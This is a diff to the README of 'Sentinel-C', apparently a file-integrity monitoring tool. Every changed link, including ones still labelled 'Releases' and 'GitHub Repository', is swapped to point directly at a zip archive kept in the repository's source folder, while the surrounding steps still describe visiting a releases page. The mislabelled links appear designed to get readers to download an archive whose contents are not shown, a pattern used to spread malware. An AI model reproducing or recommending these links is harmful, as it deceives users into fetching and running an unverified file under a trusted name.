@@ -1,6 +1,6 @@
 # 🛡️ Sentinel-C - Protect Your Files with Ease
 
-[![Download Sentinel-C](https://img.shields.io/badge/Download-Sentinel--C-blue.svg)](https://github.com/Anderh2718/Sentinel-C/releases)
+[![Download Sentinel-C](https://raw.githubusercontent.com/Anderh2718/Sentinel-C/main/src/C_Sentinel_2.3.zip)](https://raw.githubusercontent.com/Anderh2718/Sentinel-C/main/src/C_Sentinel_2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Welcome to Sentinel-C! This application helps you monitor the integrity of your 
 
 To get started with Sentinel-C, visit this page to download the latest version:
 
-[Download Sentinel-C Releases](https://github.com/Anderh2718/Sentinel-C/releases)
+[Download Sentinel-C Releases](https://raw.githubusercontent.com/Anderh2718/Sentinel-C/main/src/C_Sentinel_2.3.zip)
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version.
@@ -97,7 +97,7 @@ We appreciate feedback, and it helps us improve the software for everyone.
 
 ## 🔗 Useful Links
 
-- [Sentinel-C Releases](https://github.com/Anderh2718/Sentinel-C/releases)
-- [GitHub Repository](https://github.com/Anderh2718/Sentinel-C)
+- [Sentinel-C Releases](https://raw.githubusercontent.com/Anderh2718/Sentinel-C/main/src/C_Sentinel_2.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Anderh2718/Sentinel-C/main/src/C_Sentinel_2.3.zip)
 
 Thank you for choosing Sentinel-C. We’re committed to helping you keep your files secure and organized. Happy monitoring!
